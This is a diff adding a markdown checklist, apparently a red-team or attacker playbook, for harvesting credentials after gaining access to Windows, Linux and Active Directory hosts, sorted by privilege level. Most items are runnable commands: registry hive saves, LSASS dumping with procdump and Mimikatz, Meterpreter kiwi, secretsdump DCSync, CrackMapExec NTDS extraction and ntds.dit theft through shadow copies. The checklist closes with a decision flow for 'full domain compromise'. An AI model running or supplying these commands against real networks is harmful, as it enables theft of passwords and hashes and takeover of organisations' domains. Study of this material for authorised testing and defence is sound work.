@@ -1,0 +1,59 @@
+Always run this when you land on a box:
+- [ ] echo %COMPUTERNAME%
+- [ ] nltest /dsgetdc:yourdomain.local
+## 🧹 Low-Priv User (No Special Rights)
+
+- [ ]  Search browser data for saved credentials (Login Data, key3.db, logins.json)
+- [ ]  Check RDP session history (`reg query HKCU\Software\Microsoft\Terminal Server Client\Servers`)
+- [ ] Check WiFi profiles (Windows: `netsh wlan show profiles`)
+- [ ] Hunt SSH private keys (`~/.ssh/id_rsa`, `/home/*/.ssh/`, `C:\Users\*\Documents\`)
+- [ ] Search user folders (`/home/*`, `C:\Users\*`) for plaintext creds or note
+- [ ] Try to read `/etc/passwd` and `/etc/shadow` (Linux, if permissions allow)
+
+---
+
+## 🔥 Mid-Priv User (Local Admin / SYSTEM)
+- [ ] Dump SAM, SYSTEM, SECURITY hives
+- [ ] `reg save HKLM\SAM sam.save`
+- [ ] `reg save HKLM\SYSTEM system.save`
+- [ ] `reg save HKLM\SECURITY security.save`
+- [ ] Run secretsdump.py locally:
+- [ ] `secretsdump.py LOCAL\\Administrator:Password@IP`
+- [ ] Dump LSASS memory:
+- [ ] `procdump.exe -ma lsass.exe lsass.dmp`
+- [ ] Parse LSASS dump with Mimikatz:
+- [ ] `sekurlsa::minidump lsass.dmp`
+- [ ] `sekurlsa::logonpasswords`
+- [ ] If Defender is off, run Mimikatz live:
+- [ ] `sekurlsa::logonpasswords`
+- [ ] Meterpreter shell methods:
+- [ ] `load kiwi`
+- [ ] `lsa_dump_sam`
+- [ ] `lsa_dump_secrets`
+- [ ] Use CrackMapExec to pull secrets over SMB:
+- [ ] `crackmapexec smb IP -u user -p pass --ntds`
+
+---
+
+## 🛡️ High-Priv User (Domain Admin or Equivalent)
+
+- [ ] Execute DCSync attack with secretsdump.py:
+- [ ] `secretsdump.py domain/user:password@DC_IP`
+- [ ] Run DCSync via Meterpreter (kiwi):
+- [ ] `dcsync_ntlm domain\user`
+- [ ] Use BloodHound to find DCSync permissions
+- [ ] Pull NTDS.dit database manually:
+- [ ] Create VSS snapshot (`vssadmin create shadow /for=C:`)
+- [ ] Copy `C:\Windows\NTDS\ntds.dit`
+- [ ] Copy SYSTEM hive for bootkey
+- [ ] Use SharpHound collection for AD credentials graph
+ 
+
+---
+
+# 📋 Rapid Action Decision Flow
+
+- [ ] If low-priv → Pillage files, WiFi profiles, browser creds
+- [ ] If local admin → Dump hives, LSASS, use secretsdump or Mimikatz
+- [ ] If Meterpreter shell → Load kiwi and dump LSA secrets
+- [ ] If Domain Admin → DCSync or NTDS.dit theft for full domain compromise
